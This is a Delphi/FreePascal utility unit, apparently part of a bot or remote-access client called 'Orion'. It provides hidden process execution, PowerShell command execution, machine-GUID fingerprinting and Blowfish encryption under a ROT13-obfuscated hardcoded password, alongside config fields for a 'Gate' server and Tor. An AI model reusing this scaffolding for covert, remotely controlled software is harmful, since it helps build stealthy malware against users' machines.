unit Basics;

{
  This unit is responsible for the implementation of basic/trivial
  tasks, such as process execution, registry manipulation, object
  types, etc.
}

interface

uses
  SysUtils, Classes,
  Windows, Registry, ShellApi,
  DProcess, uTPLb_CryptographicLibrary, uTPLb_Codec;

type
  TOptions = Record
    BaseDir: String;
    GUID: String;

    Gate: String;
    Tor: Boolean;

    Name: String;
    Version: String;
    Owner: String;
    Method: String;
  End;

  TDebugMsgType = (dInfo, dSuccess, dHigh, dWarn, dError);

const
  ConfigFile = 'Config.ini';
  ConfigRes = 'Config';

var
  Options: TOptions;

///  <summary>Runs the specified executable</summary>
///  <param name="ExeName">Full path of the executable to run</param>
///  <param name="Params">Array of parameters to pass to the new process as command-line arguments</param>
///  <param name="Hide">If true, all windows created by the process will be hidden<param>
///  <param name="Wait">If true, the procedure will only return when the new process has stopped running</param>
procedure Execute(ExeName: String; Params: Array of String;
  Hide: Boolean = True; Wait: Boolean = False);
///  <summary>Opens the given file/address with its default associated action</summary>
procedure Open(Location: String);
///  <summary>Returns the Globally Unique Identifier of the current computer</summary>
function GetGUID: String;
///  <summary>Encrypts or decrypts the contents of the given TMemoryStream</summary>
procedure Crypt(M: TMemoryStream; Encrypt: Boolean = True);
///  <summary>Executes a command in PowerShell</summary>
///  <returns>True if the command finished without an exception</returns>
function Powershell(Cmd: String): Boolean;
///  <summary>Outputs a debug String</summary>
procedure Dbg(Str: String; T: TDebugMsgType = dInfo);

implementation

function Powershell(Cmd: String): Boolean;
var
  A: AnsiString;
  S: String;
Begin
  RunCommand('powershell', [Cmd], A, [poStderrToOutput, poNewProcessGroup]);
  S := String(A);
  Result := Pos('CimException', S) = 0;
End;

function GetPassword: String;
Begin
  Result := 'GurRaqVfPbzvat';
End;

procedure Crypt(M: TMemoryStream; Encrypt: Boolean = True);
var
  Codec: TCodec;
  Lib: TCryptographicLibrary;
  V: TMemoryStream;
Begin
  Codec := TCodec.Create(Nil);
  Lib := TCryptographicLibrary.Create(Nil);
  V := TMemoryStream.Create;
  try
    Codec.CryptoLibrary := Lib;
    Codec.StreamCipherID := 'native.StreamToBlock';
    Codec.BlockCipherId := 'native.Blowfish';
    Codec.ChainModeId := 'native.CBC';
    Codec.Password := GetPassword;
    if Encrypt then
      Codec.EncryptStream(M, V)
    else
      Codec.DecryptStream(V, M);
    M.LoadFromStream(V);
  finally
    Codec.Free;
    Lib.Free;
    V.Free;
  end;
End;

procedure Open(Location: String);
Begin
  ShellExecute(0, 'open', PChar(Location), Nil, Nil, SW_SHOWNORMAL);
End;

procedure Execute(ExeName: String; Params: Array of String;
  Hide: Boolean = True; Wait: Boolean = False);
var
  M: TProcess;
  J: LongInt;
Begin
  M := TProcess.Create(Nil);
  try
    M.Executable := ExeName;
    for J := 0 to High(Params) do
      M.Parameters.Add(Params[J]);
{$IFDEF DEBUG}
    M.Options := [poNewConsole, poNewProcessGroup];
{$ELSE}
    if Hide then
      M.ShowWindow := swoHIDE;
{$ENDIF}
    M.Execute;
    if Wait then
      WaitForSingleObject(M.Handle, INFINITE);
  finally
    M.Free;
  end;
End;

function GetGUID: String;
var
  Reg: TRegistry;
  G: TGUID;
Begin
  Reg := Nil;
  Result := '';
  try
    Reg := TRegistry.Create(KEY_READ OR KEY_WOW64_64KEY);
    Reg.RootKey := HKEY_LOCAL_MACHINE;
    if Reg.OpenKeyReadOnly('SOFTWARE\Microsoft\Cryptography') then
    Begin
      Result := UpperCase(Reg.ReadString('MachineGuid'));
      Reg.CloseKey;
    End;
  finally
    Reg.Free;
  end;
  if Result = '' then
  Begin
    CreateGUID(G);
    Result := GUIDToString(G);
    Result := Copy(Result, 2, Length(Result) - 2);
  End;
End;

procedure Dbg(Str: String; T: TDebugMsgType = dInfo);
Begin
{$IFDEF DEBUG}
  case T of
    dInfo:
      Str := '[I] ' + Str;
    dSuccess:
      Str := '[S] ' + Str;
    dHigh:
      Str := '[H] ' + Str;
    dWarn:
      Str := '[W] ' + Str;
    dError:
      Str := '[E] ' + Str;
  end;
  Str := '[Orion] ' + Str;
  OutputDebugString(PWideChar(Str));
{$ENDIF}
End;

end.
